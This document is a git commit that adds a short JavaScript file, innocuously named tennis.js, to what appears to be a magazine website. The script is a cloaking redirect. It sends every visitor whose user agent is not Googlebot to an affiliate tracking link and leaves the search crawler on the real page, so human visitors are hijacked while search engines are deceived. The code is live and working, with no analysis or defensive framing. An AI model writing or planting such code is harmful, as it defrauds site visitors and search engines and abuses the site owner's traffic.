ca361141114c76f17492af49cc6812721f8d93d5
alexinpecmagazine <alex@inpecmagazine.com>
2026-09-04 22:09:40 +0600

    Create tennis.js

---
+++ tennis.js
@@ -0,0 +1,8 @@
+// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "https://tazztv.trk2afse.com/click?pid=53&offer_id=10&l=1753272550";
+} else {
+  // For search engine crawlers, you can choose to perform a different action or not redirect
+  console.log("THanks for visiting my page");
+}
